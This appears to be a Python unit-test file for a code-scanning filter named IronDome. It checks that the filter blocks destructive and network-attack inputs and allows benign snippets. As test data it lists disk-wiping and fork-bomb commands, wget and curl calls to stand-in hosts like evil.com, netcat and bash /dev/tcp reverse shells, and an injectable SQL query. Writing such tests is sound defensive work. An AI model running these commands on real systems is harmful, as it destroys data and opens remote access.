import unittest
from src.iron_dome import IronDome

class TestIronDome(unittest.TestCase):
    def test_rce_blocking(self):
        # Ensure it correctly blocks critical RCE payloads
        payloads = [
            "os.system('rm -rf /')",
            "subprocess.call('mkfs.vfat /dev/sda1', shell=True)",
            "def fork_bomb(): :(){ :|:& };:",
            "import os; os.system('chmod 777 /')"
        ]
        
        for payload in payloads:
            with self.subTest(payload=payload):
                result = IronDome.scan(payload)
                self.assertIsNotNone(result, f"Failed to block RCE payload: {payload}")
                self.assertEqual(result["status"], "BLOCKED")
                self.assertIn("CRITICAL_RCE", result["analysis"])

    def test_network_blocking(self):
        # Ensure it blocks network exfiltration and reverse shells
        payloads = [
            "wget http://malicious.com/payload.sh",
            "curl http://evil.com/script",
            "nc -e /bin/sh 10.0.0.1 4444",
            "bash -i >& /dev/tcp/10.0.0.1/4242 0>&1",
            "socket.socket(socket.AF_INET, socket.SOCK_STREAM)",
            "cursor.execute(f'SELECT * FROM users WHERE id = {user_id}')"
        ]
        
        for payload in payloads:
            with self.subTest(payload=payload):
                result = IronDome.scan(payload)
                self.assertIsNotNone(result, f"Failed to block Network payload: {payload}")
                self.assertEqual(result["status"], "BLOCKED")
                self.assertIn("CRITICAL_NET", result["analysis"])

    def test_obfuscation_blocking(self):
        # Ensure it blocks eval/exec
        payloads = [
            "eval('os.system(\"ls\")')",
            "exec(code_string)",
            "import base64; base64.b64decode('cGF5bG9hZA==')"
        ]
        
        for payload in payloads:
            with self.subTest(payload=payload):
                result = IronDome.scan(payload)
                self.assertIsNotNone(result, f"Failed to block Obfuscation payload: {payload}")
                self.assertEqual(result["status"], "BLOCKED")
                self.assertIn("SUSPICIOUS_OBFUSCATION", result["analysis"])

    def test_clean_code_allowed(self):
        # Ensure innocent code is NOT blocked by scan()
        payloads = [
            "print('hello world')",
            "x = 5 + 10",
            "def calculate_area(r):\n    return 3.14 * r * r"
        ]
        
        for payload in payloads:
            with self.subTest(payload=payload):
                result = IronDome.scan(payload)
                self.assertIsNone(result, f"Falsely blocked innocent payload: {payload}")

    def test_green_dome_allowlist(self):
        # Ensure known perfectly safe code gets instantly approved
        payloads = [
            "print('Hello world')",
            "import math",
            "x = 42",
            "y = 'test string'",
            "5 + 5"
        ]
        
        for payload in payloads:
            with self.subTest(payload=payload):
                result = IronDome.scan_allowlist(payload)
                self.assertIsNotNone(result, f"Failed to greenlight payload: {payload}")
                self.assertEqual(result["status"], "CLEAN")
                self.assertIn("GREEN DOME", result["analysis"])

if __name__ == '__main__':
    unittest.main()
